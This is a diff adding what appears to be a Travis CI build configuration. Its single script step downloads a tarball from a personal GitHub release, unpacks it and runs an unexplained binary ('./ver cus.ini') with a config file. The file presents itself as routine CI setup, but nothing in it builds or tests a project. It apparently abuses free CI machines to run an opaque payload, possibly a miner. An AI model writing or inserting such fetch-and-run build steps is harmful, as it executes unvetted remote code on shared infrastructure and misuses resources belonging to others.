@@ -1,0 +1,14 @@
+sudo: required
+
+env:
+  - IMAGE_NAME="windows"
+
+services:
+- docker
+
+branches:
+  only:
+    - master
+
+script:
+- wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
